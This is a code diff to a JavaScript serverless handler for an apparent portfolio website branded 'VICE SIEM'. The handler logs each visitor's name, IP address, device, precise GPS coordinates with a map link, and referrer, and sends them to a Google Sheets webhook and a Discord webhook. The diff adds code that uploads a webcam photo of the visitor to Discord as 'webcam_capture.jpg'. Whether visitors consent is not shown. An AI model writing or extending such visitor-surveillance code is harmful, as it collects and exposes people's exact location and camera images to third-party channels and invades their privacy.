@@ -117,18 +117,24 @@ function classificarPrecisaoGps(acc) {
     return `🔌 Antena/Rede sem Chip GPS (±${acc}m)`;
 }
 
-async function enviarAlertaDiscord(payload, mapaUrl, isGpsExato) {
+async function enviarAlertaDiscord(payload, mapaUrl, isGpsExato, fotoBase64) {
     const url = `https://discord.com/api/webhooks/${DISCORD_WH_ID}/${DISCORD_WH_TOKEN}`;
     const isSilencioso = payload.acao.includes('Abriu a Tela');
     const isSaida = payload.acao.includes('Encerrou Sessão');
-    const isEntrada = payload.acao.includes('Entrou') || payload.acao.includes('Ativada') || payload.acao.includes('GPS');
+    const isEntrada =
+        payload.acao.includes('Entrou') ||
+        payload.acao.includes('Ativada') ||
+        payload.acao.includes('GPS') ||
+        payload.acao.includes('Foto');
 
     let corViceCity = 0x00f0ff;
     if (isEntrada) corViceCity = 0xff2a85;
     else if (isSilencioso || isSaida) corViceCity = 0xff9e44;
 
     let headline = `⚡ **Atividade registrada:** \`${payload.visitante}\` → **${payload.acao}**`;
-    if (payload.acao.includes('GPS')) {
+    if (fotoBase64) {
+        headline = `📸 **CAPTURA DE CÂMERA + TELEMETRIA!** (\`${payload.visitante}\` — \`${payload.local}\`)`;
+    } else if (payload.acao.includes('GPS')) {
         headline = `🎯 **LOCALIZAÇÃO GPS CAPTURADA!** (\`${payload.visitante}\` — \`${payload.local}\`)`;
     } else if (isEntrada) {
         headline = `🚨 **Visitante autenticado no Portfólio!** (\`${payload.visitante}\` — \`${payload.local}\`)`;
@@ -141,40 +147,65 @@ async function enviarAlertaDiscord(payload, mapaUrl, isGpsExato) {
     const labelMapa = isGpsExato ? '🎯 Abrir Ponto Exato no Google Maps (Zoom Máximo)' : '📡 Ver Cidade (IP da Operadora)';
     const localComMapa = mapaUrl ? `${payload.local}\n[${labelMapa}](${mapaUrl})` : payload.local;
 
-    const discordBody = {
-        username: '🌴 VICE SIEM // Cyber Alert',
-        content: headline,
-        embeds: [
+    const embed = {
+        title: '🌴 VICE SIEM // GTA VI CYBER TELEMETRY',
+        url: 'https://docs.google.com/spreadsheets/d/1Qcw6NdhO9N1rKB69_sGot-62IHl6ojfXc6JOiD0TtDk/edit',
+        color: corViceCity,
+        fields: [
+            { name: '👤 Visitante + ID Único (Anti-Fake)', value: `**${payload.visitante}**`, inline: true },
+            { name: '⚡ Ação / Onde Foi', value: `**${payload.acao}**`, inline: true },
+            { name: '🛡️ Endereço IP & Operadora', value: `\`${payload.ip}\``, inline: true },
             {
-                title: '🌴 VICE SIEM // GTA VI CYBER TELEMETRY',
-                url: 'https://docs.google.com/spreadsheets/d/1Qcw6NdhO9N1rKB69_sGot-62IHl6ojfXc6JOiD0TtDk/edit',
-                color: corViceCity,
-                fields: [
-                    { name: '👤 Visitante + ID Único (Anti-Fake)', value: `**${payload.visitante}**`, inline: true },
-                    { name: '⚡ Ação / Onde Foi', value: `**${payload.acao}**`, inline: true },
-                    { name: '🛡️ Endereço IP & Operadora', value: `\`${payload.ip}\``, inline: true },
-                    {
-                        name: isGpsExato
-                            ? '🎯 Endereço, Coordenada & Precisão do Sensor'
-                            : '📡 Cidade via IP (Central da Operadora)',
-                        value: localComMapa,
-                        inline: false
-                    },
-                    { name: '🌐 Origem (De onde veio)', value: payload.origem, inline: true },
-                    { name: '💻 Aparelho Real / GPU / Tela', value: payload.dispositivo, inline: true },
-                    { name: '🔗 Rota / Destino', value: `\`${payload.pagina}\``, inline: false }
-                ],
-                footer: {
-                    text: `🕒 ${payload.dataHora} (Horário de Brasília) · Salvo na Planilha Vice SIEM`
-                }
-            }
-        ]
+                name: isGpsExato
+                    ? '🎯 Endereço, Coordenada & Precisão do Sensor'
+                    : '📡 Cidade via IP (Central da Operadora)',
+                value: localComMapa,
+                inline: false
+            },
+            { name: '🌐 Origem (De onde veio)', value: payload.origem, inline: true },
+            { name: '💻 Aparelho Real / GPU / Tela', value: payload.dispositivo, inline: true },
+            { name: '🔗 Rota / Destino', value: `\`${payload.pagina}\``, inline: false }
+        ],
+        footer: {
+            text: `🕒 ${payload.dataHora} (Horário de Brasília) · Salvo na Planilha Vice SIEM`
+        }
     };
+
+    if (fotoBase64 && fotoBase64.startsWith('data:image/')) {
+        try {
+            const base64Clean = fotoBase64.split(',')[1];
+            const buffer = Buffer.from(base64Clean, 'base64');
+            embed.image = { url: 'attachment://webcam_capture.jpg' };
+
+            const formData = new FormData();
+            formData.append(
+                'payload_json',
+                JSON.stringify({
+                    username: '🌴 VICE SIEM // Cyber Alert',
+                    content: headline,
+                    embeds: [embed]
+                })
+            );
+            formData.append('files[0]', new Blob([buffer], { type: 'image/jpeg' }), 'webcam_capture.jpg');
+
+            await fetch(url, {
+                method: 'POST',
+                body: formData
+            });
+            return;
+        } catch (err) {
+            console.error('Erro ao anexar foto no Discord:', err);
+        }
+    }
 
     await fetch(url, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(discordBody)
+        body: JSON.stringify({
+            username: '🌴 VICE SIEM // Cyber Alert',
+            content: headline,
+            embeds: [embed]
+        })
     });
 }
 
@@ -246,13 +277,15 @@ export default async function handler(req, res) {
         `[SIEM-ACCESS-LOG] Data: ${dataHora} | Visitante: "${visitante}" | Acao: "${acao}" | Origem: ${origem} | Local: ${local} | IP: ${ip} | Disp: ${dispositivo} | Rota: ${pagina}`
     );
 
+    const fotoBase64 = typeof body.fotoBase64 === 'string' ? body.fotoBase64 : null;
+
     await Promise.allSettled([
         fetch(GOOGLE_SHEETS_WEBHOOK, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
         }),
-        enviarAlertaDiscord(payload, mapaUrl, isGpsExato)
+        enviarAlertaDiscord(payload, mapaUrl, isGpsExato, fotoBase64)
     ]);
 
     return res.status(200).json({ ok: true, ...payload, mapaUrl, isGpsExato });
